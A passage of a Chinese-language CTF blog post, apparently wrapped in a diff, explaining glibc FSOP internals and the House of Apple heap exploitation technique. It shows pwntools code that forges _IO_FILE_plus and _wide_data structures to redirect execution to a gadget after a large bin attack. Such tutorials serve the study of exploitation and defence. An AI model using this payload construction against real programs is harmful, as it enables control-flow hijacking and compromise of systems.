class="keyword">return</span> result;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+<h3 id="io_flush_all">_IO_flush_all()</h3>
+<p>同样在这个文件中，可以找到<code>_IO_flush_all</code>:</p>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_flush_all (<span class="type">void</span>)</span><br><span class="line">{</span><br><span class="line">  <span class="type">int</span> result = <span class="number">0</span>;</span><br><span class="line">  FILE *fp;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  _IO_cleanup_region_start_noarg (flush_cleanup);</span><br><span class="line">  _IO_lock_lock (list_all_lock);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (fp = (FILE *) _IO_list_all; fp != <span class="literal">NULL</span>; fp = fp-&gt;_chain)</span><br><span class="line">    {</span><br><span class="line">      run_fp = fp;</span><br><span class="line">      _IO_flockfile (fp);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line">       || (_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">           &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">                    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class="line">       )</span><br><span class="line">      &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class="line">    result = EOF;</span><br><span class="line"></span><br><span class="line">      _IO_funlockfile (fp);</span><br><span class="line">      run_fp = <span class="literal">NULL</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  _IO_lock_unlock (list_all_lock);</span><br><span class="line">  _IO_cleanup_region_end (<span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_cthreads_flockfile (FILE *fp)</span><br><span class="line">{</span><br><span class="line">  _IO_lock_lock (*fp-&gt;_lock);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> _IO_flockfile (FILE *)</span><br><span class="line">     __attribute__ ((alias (<span class="string">"_cthreads_flockfile"</span>)));</span><br><span class="line"></span><br><span class="line"><span class="comment">// ...</span></span><br></pre></td></tr></tbody></table></figure>
+<p><code>_IO_FILE_plus</code> 在 <code>/libio/stdfiles.c</code> 有定义</p>
+<p>主要关注这个函数中的判断条件，如果前面的条件<strong>满足</strong>，会进入<code>_IO_OVERFLOW (fp, EOF)</code>，这是一个宏定义，位于 <code>/libio/libioP.h</code>：</p>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Type of MEMBER in struct type TYPE.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_MEMBER_TYPE(TYPE, MEMBER) __typeof__ (((TYPE){}).MEMBER)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Essentially ((TYPE *) THIS)-&gt;MEMBER, but avoiding the aliasing</span></span><br><span class="line"><span class="comment">   violation in case THIS has a different pointer type.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_CAST_FIELD_ACCESS(THIS, TYPE, MEMBER) \</span></span><br><span class="line"><span class="meta">  (*(_IO_MEMBER_TYPE (TYPE, MEMBER) *)(((char *) (THIS)) \</span></span><br><span class="line"><span class="meta">				       + offsetof(TYPE, MEMBER)))</span></span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_JUMPS_FILE_plus(THIS) \</span></span><br><span class="line"><span class="meta">  _IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE_plus, vtable)</span></span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> _IO_JUMPS_FUNC(THIS) \</span></span><br><span class="line"><span class="meta">  (IO_validate_vtable                                                   \</span></span><br><span class="line"><span class="meta">   (*(struct _IO_jump_t **) ((void  +*) &amp;_IO_JUMPS_FILE_plus (THIS)	\</span></span><br><span class="line"><span class="meta">			     + (THIS)-&gt;_vtable_offset)))	</span></span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> JUMP1(FUNC, THIS, X1) (_IO_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS, X1)</span></span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_OVERFLOW(FP, CH) JUMP1 (__overflow, FP, CH)</span></span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">IO_validate_vtable (<span class="type">const</span> <span class="keyword">struct</span> _IO_jump_t *vtable)</span><br><span class="line">{</span><br><span class="line">  <span class="type">uintptr_t</span> ptr = (<span class="type">uintptr_t</span>) vtable;</span><br><span class="line">  <span class="type">uintptr_t</span> offset = ptr - (<span class="type">uintptr_t</span>) &amp;__io_vtables;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (offset &gt;= IO_VTABLES_LEN))</span><br><span class="line">    <span class="comment">/* The vtable pointer is not in the expected section.  Use the</span></span><br><span class="line"><span class="comment">       slow path, which will terminate the process if necessary.  */</span></span><br><span class="line">    _IO_vtable_check ();</span><br><span class="line">  <span class="keyword">return</span> vtable;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+<p>如果通过<strong>合法性检查</strong>，那么会执行<code>_vtable-&gt;__overflow</code></p>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> JUMP_FIELD(TYPE, NAME) TYPE NAME</span></span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span></span></span><br><span class="line"><span class="class">{</span></span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">    JUMP_FIELD(_IO_overflow_t, __overflow);</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+<p>这里<code>__overflow</code> 是<code>_IO_jump_t vtable</code> 中的虚函数，这是 GLIBC 中实现 I/O 多态的核心机制</p>
+<h4 id="vtable2">vtable<a href="#fn2" class="footnote-ref" id="fnref2" role="doc-noteref"><sup>2</sup></a></h4>
+<p>通过虚函数表（vtable）为不同类型的文件流（如文件、内存流、字符串流）提供统一的接口，同时允许不同流类型自定义底层操作（如读、写、缓冲区管理）。</p>
+<p>我们可以在 <code>/libio/vtables.c</code> 中找到相关的定义。</p>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> __<span class="title">io_vtables</span>[] <span class="title">attribute_relro</span> =</span></span><br><span class="line">{</span><br><span class="line">  <span class="comment">/* _IO_str_jumps  */</span></span><br><span class="line">  [IO_STR_JUMPS] =</span><br><span class="line">  {</span><br><span class="line">	JUMP_INIT_DUMMY,</span><br><span class="line">    JUMP_INIT (finish, _IO_str_finish),</span><br><span class="line">  <span class="comment">//...</span></span><br><span class="line">  },</span><br><span class="line">  [IO_WSTR_JUMPS] = {</span><br><span class="line">	JUMP_INIT_DUMMY,</span><br><span class="line">    JUMP_INIT (finish, _IO_wstr_finish),</span><br><span class="line">  <span class="comment">//...</span></span><br><span class="line">  },</span><br><span class="line">  <span class="comment">//...</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+<p>也就是说，<code>__overflow</code>
+实际是执行<code>__io_vtables</code> 中已定义的相关函数。如 <code>finish</code>，会根据不同 I/O 类型执行不同函数，例如 <code>[IO_STR_JUMPS]</code> 中指向<code>_IO_str-finish</code>；<code>[IO_WSTR_JUMPS]</code> 中指向<code>_IO_wstr_finish</code>。</p>
+<h1 id="iii.-house-of-apple">III. House of Apple</h1>
+<p>在上一节中，我们知道在<code>_IO_JUMPS_FUNC(THIS)</code> 这个宏中验证了 <code>const struct _IO_jump_t *vtable</code> 是否是合法的：即它指向的地址是否在<code>__io_vtables</code> 的范围内。这也让我们不能通过直接伪造 <code>vtable</code> 来控制程序执行流。</p>
+<p>然而，我们仍有机会修改 <code>vtable</code> 为不同的合法虚表。这导致了后续函数执行过程中存在可利用的漏洞。</p>
+<h2 id="构造_io_file_plus">构造<code>_IO_FILE_plus</code></h2>
+<p>使用 House of Apple 的前提是 Large bin
+attack，它将一个堆地址写在任意地址处。</p>
+<p>这里将 <code>&amp;_IO_list_all</code> 处写可控堆地址，然后开始伪造<code>_IO_FILE_plus</code>。</p>
+<p>由于 Large bin
+attack 是把堆的头部 <code>prev_size</code> 地址写入，而一般我们只能从 <code>fd</code> 域开始编辑，所以下文的伪造会从 <code>fd</code> 开始。</p>
+<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">fake_io = flat({</span><br><span class="line">	<span class="number">0x18</span>:[</span><br><span class="line">		p64(<span class="number">1</span>) <span class="comment"># _IO_write_ptr [fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base]</span></span><br><span class="line">	],</span><br><span class="line">	<span class="number">0x60</span>:[</span><br><span class="line">		p32(<span class="number">0</span>) <span class="comment"># _fileno</span></span><br><span class="line">	],</span><br><span class="line">	<span class="number">0x78</span>:[</span><br><span class="line">		p64(_IO_stdfile_2_lock) <span class="comment"># *_lock [_IO_flockfile (fp);]</span></span><br><span class="line">	],</span><br><span class="line">	<span class="number">0xb0</span>:[</span><br><span class="line">		p32(<span class="number">0xFFFFFFFF</span>) <span class="comment"># _mode [fp-&gt;_mode &lt;= 0]</span></span><br><span class="line">	]</span><br><span class="line">})</span><br></pre></td></tr></tbody></table></figure>
+<h2 id="wide_data调用链"><code>_wide_data</code> 调用链</h2>
+<p>尽管无法直接通过修改 <code>vtable</code> 控制执行流，但是<code>_wide_data-&gt;_wide_vtable</code> 在执行时缺少安全检查。</p>
+<p>因此我们可以构造如下调用链，其中涉及到的方法和宏可自行查阅：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">_IO_OVERFLOW (fp, EOF)-&gt;</span><br><span class="line">(_IO_overflow_t) _IO_wfile_overflow-&gt;</span><br><span class="line">_IO_wdoallocbuf (f)-&gt;</span><br><span class="line">_IO_WDOALLOCATE (fp)-&gt;</span><br><span class="line">Backdoor(fp) # fake vtable points at</span><br></pre></td></tr></tbody></table></figure>
+<h2 id="构造_wide_data-_wide_vtable">构造<code>_wide_data</code>,
+<code>_wide_vtable</code></h2>
+<p>为了使用上面的调用链，需要修改 <code>*_wide_data</code> 到我们伪造的<code>_IO_wide_data</code>。</p>
+<p>这里有一个巧妙的处理，我们可以将其指向之前伪造的<code>_IO_FILE_plus</code> 处，因为<code>_IO_wide_data</code> 中部分成员是与<code>_IO_FILE</code> 相同的。</p>
+<p>然后在<code>_wide_data-&gt;_wide_vtable</code> 处写构造的 vtable 地址。</p>
+<p><img src="\glibcFSOP/image-20250408191324901.png"></p>
+<figure>
+<img src="glibcFSOP/image-20250408193602020.png" alt="image-20250408193602020">
+<figcaption aria-hidden="true">image-20250408193602020</figcaption>
+</figure>
+<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">_IO_stdfile_2_lock = libc_base + <span class="number">0x205700</span> <span class="comment"># find your offset in gdb</span></span><br><span class="line">IO_file_addr = heap_base + <span class="number">0x0d00</span></span><br><span class="line">IO_wide_data_addr = IO_file_addr</span><br><span class="line">wide_vtable_addr = file_addr + <span class="number">0xe8</span>-<span class="number">0x68</span> </span><br><span class="line"></span><br><span class="line">fake_io = flat({</span><br><span class="line">	<span class="number">0x18</span>:[</span><br><span class="line">		p64(<span class="number">1</span>) <span class="comment"># _IO_write_ptr [fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base]</span></span><br><span class="line">	],</span><br><span class="line">	<span class="number">0x60</span>:[</span><br><span class="line">		p32(<span class="number">0</span>) <span class="comment"># _fileno</span></span><br><span class="line">	],</span><br><span class="line">	<span class="number">0x78</span>:[</span><br><span class="line">		p64(_IO_stdfile_2_lock) <span class="comment"># *_lock [_IO_flockfile (fp);]</span></span><br><span class="line">	],</span><br><span class="line">	<span class="number">0x90</span>:[</span><br><span class="line">		p64(IO_wide_data_addr) <span class="comment"># *_wide_data</span></span><br><span class="line">	],</span><br><span class="line">	<span class="number">0xb0</span>:[</span><br><span class="line">		p32(<span class="number">0xFFFFFFFF</span>) <span class="comment"># _mode [fp-&gt;_mode &lt;= 0]</span></span><br><span class="line">	],</span><br><span class="line">	<span class="number">0xc8</span>:[</span><br><span class="line">		p64(libc_base+libc.sym[<span class="string">'_IO_wfile_jumps'</span>]) <span class="comment"># vtable</span></span><br><span class="line">	],</span><br><span class="line">	<span class="number">0xd0</span>:[</span><br><span class="line">		p64(wide_vtable_addr)</span><br><span class="line">	],</span><br><span class="line">	<span class="number">0xd8</span>:[</span><br><span class="line">		p64(gadget)</span><br><span class="line">	]</span><br><span class="line">})</span><br></pre></td></tr></tbody></table></figure>
+<p>这样，就控制了程序执行流，并且 <code>$rdi = &amp;fp</code>。</p>
+<p>对于 House of Apple 的实践，您也可以阅读我的这篇文章：<a target="_blank" rel="noopener" href="https://summ2.link/2025/02/18/2025218-HGAME-2025-Week-2-Writeup/#where-is-the-vulnerability">HGAME
+2025 Week 2 Writeup</a></p>
+<h1 id="references">References</h1>
+<section id="footnotes" class="footnotes footnotes-end-of-document" role="doc-endnotes">
+<hr>
+<ol>
+<li id="fn1"><p><a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-273832.htm">看雪：House of apple
+一种新的 glibc 中 IO 攻击方法</a><a href="#fnref1" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
+<li id="fn2"><p><a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-274625.htm">看雪：Pwn 堆利用学习 ——
+FSOP、House of Orange</a><a href="#fnref2" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
+</ol>
+</section>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/pwn/" rel="tag"><i class="fa fa-tag"></i> pwn</a>
+              <a href="/tags/FSOP/" rel="tag"><i class="fa fa-tag"></i> FSOP</a>
+              <a href="/tags/House-of-Apple/" rel="tag"><i class="fa fa-tag"></i> House of Apple</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2025/03/20/2025320-HGAME-2025-Final-%E5%A4%8D%E7%8E%B0/" rel="prev" title="HGAME 2025 Final 复现">
+                  <i class="fa fa-angle-left"></i> HGAME 2025 Final 复现
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+<div class="custom-footer">
+  <span>summ2's blog</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/sidebar.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+  
+
+  <script class="next-config" data-name="enableMath" type="application/json">true</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"tags":"none","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mathjax/3.2.2/es5/tex-mml-chtml.js","integrity":"sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI="}}</script>
+<script src="/js/third-party/math/mathjax.js"></script>
+
+
+
+</body>
+</html>
